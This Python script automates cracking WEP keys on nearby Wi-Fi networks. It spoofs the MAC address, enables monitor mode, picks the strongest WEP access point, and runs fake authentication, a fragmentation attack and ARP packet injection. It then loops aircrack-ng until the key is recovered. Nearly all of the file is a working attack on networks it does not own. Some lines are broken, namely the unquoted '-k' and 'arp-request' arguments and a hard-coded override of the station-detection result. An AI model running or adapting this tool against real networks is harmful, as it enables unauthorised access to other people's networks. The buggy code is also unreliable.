# -*- coding: utf-8 -*-

# This script cracks WEP keys.
#
# Copyright (C) 2012 Denis BEURIVE
# 
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>

import subprocess
import sys
import time
import signal
import re
import os
import getopt
from aircrack import *
from system import *

# Set configuration.

DEBUG			= False
WI				= 'wlan1'
WI_REAL_MAC		= 'aa:dd:ee:dd:cc:00'
WORKING_DIR		= "%s/../data" % os.path.dirname(os.path.realpath(__file__))
AIRODUMP_PREFIX	= 'out'
DUMP_DURATION 	= 10



def launchTerminal(in_command, in_terminal=True):
	if (in_terminal):
		command = ['lxterminal', '--working-directory=%s' % WORKING_DIR, '-e', " ".join(in_command)]
	else:
		command = in_command

	print("%s" % " ".join(command))
	child_pid = os.fork()
	if child_pid == 0:
		# Note that the following process should never end...
		os.chdir(WORKING_DIR)
		subprocess.check_output(command, shell=False, universal_newlines=True)
		sys.exit(0)
	return child_pid

def killAllAirodump():
	pids   = process.ps()
	regexp = re.compile('airodump-ng\s+')
	for pid in pids:
		match = regexp.search(pid['COMMAND'])
		if match:
			p = pid['PID']
			os.kill(int(p), signal.SIGINT)

def killAllAireplay():
	pids   = process.ps()
	regexp = re.compile('aireplay-ng\s+')
	for pid in pids:
		match = regexp.search(pid['COMMAND'])
		if match:
			p = pid['PID']
			os.kill(int(p), signal.SIGINT)
	
def getIvs():
	regexp = '^%s-\d+\.ivs$' % AIRODUMP_PREFIX
	fre = re.compile(regexp)
	files = os.listdir(WORKING_DIR)
	ivs = []
	for file in files:
		path = "%s/%s" % (WORKING_DIR, file)
		if re.match(fre, file): ivs.append(path)
	return ivs

def getGetFragmentFile():
	regexp = '^.+\.xor$'
	fre = re.compile(regexp)
	files = os.listdir(WORKING_DIR)
	xors = []
	for file in files:
		path = "%s/%s" % (WORKING_DIR, file)
		if re.match(fre, file): xors.append(path)
	return xors


def workingFiles():
	fre1 = re.compile('^%s-\d+\.(ivs|csv)$' % AIRODUMP_PREFIX)
	fre2 = re.compile('^.+\.(cap|xor)$')
	files = os.listdir(WORKING_DIR)
	wf = []
	for file in files:
		path = "%s/%s" % (WORKING_DIR, file)
		if re.match(fre1, file): wf.append(path)
		if re.match(fre2, file): wf.append(path)
	return wf

try:
	cli_long  = ['nowindow', 'nomac']
	cli_short = ''
	optlist, args = getopt.getopt(sys.argv[1:], cli_short, cli_long)

	cli_window = True
	cli_chmac   = True
	for o, a in optlist:
		# print("-- %s" % o)
		if o == '--nowindow':
			cli_window = False
		if o == '--nomac':
			cli_chmac = False

	if cli_window:
		print("Running in a graphical environnent.")
	else:
		print("Running in console mode.")

	if cli_chmac:
		print("MAC will be changed.")
	else:
		print("MAC will *NOT* be changed.")
	print("")

	print("Change directory to %s" % WORKING_DIR)
	os.chdir(WORKING_DIR)

	# ----------------------------------------------------------------------
	# Sanity actions
	# ----------------------------------------------------------------------

	sys.stdout.write("Make sure that no scan is running.")
	killAllAirodump();
	print(".. DONE")

	sys.stdout.write("Make sure that no attack is running.")
	killAllAireplay()
	print(".. DONE")

	sys.stdout.write("Killing all process that can disrupt cracking.")
	airmon.cleanEnvironment()
	print(".. DONE")
	print("")

	# ----------------------------------------------------------------------
	# Initialize the wireless interfaces
	# ----------------------------------------------------------------------

	print("Get the list of all wireless interface.")
	interfaces = wireless.get()
	for interface in interfaces['essid']:
		print("\t- %s" % interface)
	print("")
	
	if (not WI in interfaces['essid']) and (not WI in interfaces['monitor']):
		raise RuntimeError("ERROR: Interface %s is not in the list of wireless interfaces!" % WI)

	print("Shutdown all wireless interfaces:")
	for interface in interfaces['essid']:
		sys.stdout.write("\t- %s." % interface)
		wireless.stop(interface)
		print(".. DONE")
	print("")	
		
	print("Shutdown all monitored interfaces:")
	for interface in interfaces['monitor']:
		sys.stdout.write("\t- %s." % interface)
		airmon.stopInterface(interface)
		print(".. DONE")
	print("")	

	# ----------------------------------------------------------------------
	# Prepare wireless interfaces
	# ----------------------------------------------------------------------

	my_mac = WI_REAL_MAC
	if cli_chmac:
		print("Change MAC for %s." % WI)
		mac = wireless.changeMac(WI)
		print("\tOld: %s" % mac['old'])
		print("\tNew: %s" % mac['new'])
		my_mac = mac['new']
		print ("")
	
	print("Enable monitor mode for interface %s." % WI)
	mon = airmon.startInterface(WI)
	print("New interface's alias is: %s" % mon)
	print ("")

	# ----------------------------------------------------------------------
	# Launch airodump-ng
	# ----------------------------------------------------------------------

	media.beep_go()
	if not DEBUG:
		print("Cleaning working directory %s" % WORKING_DIR)
		for file in workingFiles():
			print("\t- Deleting CSV file %s" % file)
			os.unlink(file)
		print ("")
	
		print ("Scanning wireless network for WEP...")
		command   = ['airodump-ng', '--encrypt=WEP', '--output-format=csv', '--write=%s' % AIRODUMP_PREFIX, WI]
		child_pid = launchTerminal(command, cli_window)
		print("Waiting for process PID=%d to complete..." % child_pid)
		time.sleep(DUMP_DURATION)

		pids = process.ps()
		p = None
		regexp = re.compile('airodump-ng\s+')
		for pid in pids:
			match = regexp.search(pid['COMMAND'])
			if match:
				p = pid['PID']
				break
		if p is None: raise RuntimeError("Could not found process airodump-ng!")
		print("Send SIGINT to process %s" % p)	
		os.kill(int(p), signal.SIGINT)
		print ("Process airodump-ng stopped!")
		os.waitpid(child_pid, 0)
		print("Child terminal is gone. That's OK.")
		print("")
	
	# ----------------------------------------------------------------------
	# Load CSV file and analyse it.
	# ----------------------------------------------------------------------

	bssid    = None
	station  = None
	channel  = None
	name     = None
	
	csv_path = "%s/%s-01.csv" % (WORKING_DIR, AIRODUMP_PREFIX)
	sys.stdout.write("Loading file %s." % csv_path)	
	csv_data = airodump.loadCsv(csv_path)
	print (".. DONE")
	print ("")

	if 0 == len(csv_data['AP']): raise RuntimeError("No station found!")

	associated_station = True
	print ("Looking for the best candidate.")
	associated = airodump.getAssociatedStations(csv_data)
	if len(associated) == 0:
		print("No associated access point found")
		associated_station = False
		print("Run attack with no associated station")

	associated_station = False

	if associated_station:
		best = airodump.getBestAssociatedStation(csv_data)
		media.beep_ok()

		bssid    = airodumpap.AirodumpAp.get(best['AP'], 'bssid')
		channel  = airodumpap.AirodumpAp.get(best['AP'], 'channel')
		name     = airodumpstation.AirodumpStation.get(best['STATION'], 'probed essids')
		station  = airodumpstation.AirodumpStation.get(best['STATION'], 'station mac')

		print("Found a good candidate:")
		print("\t- bssid   = %s"  % bssid)
		print("\t- channel = %s"  % channel)
		print("\t- station = %s"  % station)
		print("\t- name    = %s"  % name)
		print("\t- iv      = %s"  % airodumpap.AirodumpAp.get(best['AP'], 'iv'))
		print("")
	else:
		best = airodump.getBestStation(csv_data)
		if None == best: raise RuntimeError("No appropriate AP found!")
		print("Get the best 'AP'...")
		media.beep_ok()
		bssid    = airodumpap.AirodumpAp.get(best, 'bssid')
		channel  = airodumpap.AirodumpAp.get(best, 'channel')
		name     = airodumpap.AirodumpAp.get(best, 'essid')
		power    = airodumpap.AirodumpAp.get(best, 'power')

		if 1 == int(power): raise RuntimeError("All AP are not powerfull enough... abort")

		print("Found a good candidate:")
		print("\t- bssid   = %s"  % bssid)
		print("\t- channel = %s"  % channel)
		print("\t- name    = %s"  % name)
		print("\t- power   = %d (real is %s)"  % (abs(int(power)), power))
		print("")

	# ----------------------------------------------------------------------
	# Prepare files' names. 
	# ----------------------------------------------------------------------

	now  = time.time()
	KEY  = "%s/%s.%d.key" % (WORKING_DIR, name, now)    # Where to save the WEP key
	DATA = "%s/%s.%d.dat" % (WORKING_DIR, name, now)    # Where to save the AP's signature

	# ----------------------------------------------------------------------
	# Launch airodump-ng on the target
	# ----------------------------------------------------------------------
	
	media.beep_go()
	print ("Scanning target access point...")
	command = ['airodump-ng', '--bssid=%s' % bssid, '--channel=%s' % channel, '--ivs', '--write=%s' % AIRODUMP_PREFIX, WI]
	launchTerminal(command, cli_window)
	print("")
	media.beep_ok()
	time.sleep(3)
	
	# ----------------------------------------------------------------------
	# Try fake authentication
	# ----------------------------------------------------------------------
	
	print("Try fake authentication...")
	media.beep_go()
	command = ['aireplay-ng', '--fakeauth=0', '-e', name, '-a', bssid, '-h', my_mac, WI]
	print (" ".join(command))
	subprocess.check_call(command, shell=False, universal_newlines=True)
	media.beep_ok()
	time.sleep(1)

	# ----------------------------------------------------------------------
	# Go...
	# ----------------------------------------------------------------------
	
	if not associated_station:

		# -------------------------------------------------------------------
		# If the AP is not associated, then try to obtain PRGA, and use it.
		# -------------------------------------------------------------------

		print("Try to get PRGA")
		command = ['aireplay-ng', '-5', '-b', bssid, '-h', my_mac, WI]
		print (" ".join(command))
		subprocess.check_call(command, shell=False, universal_newlines=True)
		xors = getGetFragmentFile()
		if len(xors) == 0: raise RuntimeError("Internel error: no fragment found???")
		if len(xors) > 1:  raise RuntimeError("Internel error: found more than one fragment???")
		fragment = xors[0]
		print("PRGA file is %s" % fragment)
		print("")

		print("Create ARP request from PRGA")
		command = ['packetforge-ng',
                           '-0',
                           '-a', 
                           bssid,
                           '-h',
                           my_mac,
                           -k,
                           '255.255.255.255',
                           '-y',
                           fragment,
                           '-w',
                           'arp-request']
		launchTerminal(command, cli_window)
		print("")

		print("Inject ARP request")
		command =  ['aireplay-ng', '-2', '-r', arp-request, WI]
		launchTerminal(command, cli_window)
		print("")

	else:

		# -------------------------------------------------------------------
		# If the AP is associate, just go on...
		# -------------------------------------------------------------------

		print("Launch ARP attack...")
		command = ['aireplay-ng', '--arpreplay', '-b', bssid, '-h', my_mac, WI]
		print (" ".join(command))
		launchTerminal(command, cli_window)
		print("")	
		time.sleep(1)

	# ----------------------------------------------------------------------
	# Launch aircrack
	# ----------------------------------------------------------------------

	while True:
		try:
			print("Launch aircrack...")
			media.beep_go()
			media.beep_go()
			command = ['aircrack-ng', '-a', 'wep', '-n', '128', '-b', bssid, '-l', KEY]
			for iv in getIvs():
				command.append(iv)
			print ("==> %s" % " ".join(command))
			subprocess.check_call(command, shell=False, universal_newlines=True)
			break
		except Exception:
			media.beep_error()
			print ("An error occured... restart aircrack.")
			print ("Error! %s" % sys.exc_info()[1])
			time.sleep(1)
			continue


	print("")	
	media.beep_success()

	# ----------------------------------------------------------------------
	# Save data about this access point.
	# ----------------------------------------------------------------------

	file = open(DATA, 'w')
	file.write("- bssid   = %s%s"  % (bssid,   os.linesep))
	file.write("- channel = %s%s"  % (channel, os.linesep))
	file.write("- name    = %s%s"  % (name,    os.linesep))
	if associated_station:
		file.write("- station = %s%s"  % (station, os.linesep))
	file.close()



except Exception:
	print ("Error! %s" % sys.exc_info()[1])
	media.beep_error()
	
